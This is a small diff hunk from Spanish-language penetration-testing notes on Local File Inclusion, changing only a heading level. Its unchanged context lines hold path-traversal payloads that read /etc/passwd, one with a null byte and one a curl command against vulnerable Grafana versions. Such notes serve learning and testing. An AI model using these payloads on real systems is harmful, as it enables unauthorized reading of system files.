@@ -26,7 +26,7 @@ http://10.10.10.10/index.php?page=curso.php
 ```bash
 ../../etc/passwd%00
 ```
-##### LFI en Grafana
+#### LFI en Grafana
 Con CURL. En alguna versión vulnerable de "Grafana", se puede ver ficheros de la máquina de la siguiente manera:
 ```bash
 curl http://ip/../../../../../../../../etc/passwd --path-as-is -o fichero.extension
